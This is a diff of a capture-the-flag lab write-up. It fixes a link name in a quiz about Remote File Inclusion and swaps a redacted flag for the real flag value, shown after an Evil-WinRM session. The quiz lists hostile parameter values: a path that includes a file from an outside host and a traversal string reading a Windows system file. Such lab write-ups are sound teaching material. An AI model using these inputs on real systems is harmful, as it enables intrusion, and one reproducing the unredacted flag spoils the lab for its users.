@@ -79,7 +79,7 @@ Which of the following values for the `page` parameter would be an example of ex
 ```
 # Task 5
 
-Which of the following values for the `page` parameter would be an example of exploiting a [Remote File Include (RFI)](../../../../3%20-%20Tags/Hacking%20Concepts/Remote%20File%20Include%20(RFI).md) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
+Which of the following values for the `page` parameter would be an example of exploiting a [Remote File Inclusion (RFI)](../../../../3%20-%20Tags/Hacking%20Concepts/Remote%20File%20Inclusion%20(RFI).md) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
 
 ```bash
   //10.10.14.6/somefile
@@ -276,7 +276,7 @@ Mode                 LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
- {{REDACTED_FLAG}}
+ea81b7afddd03efaa0945333ed147fac
 *Evil-WinRM* PS C:\Users\mike\Desktop> 
 
 ```
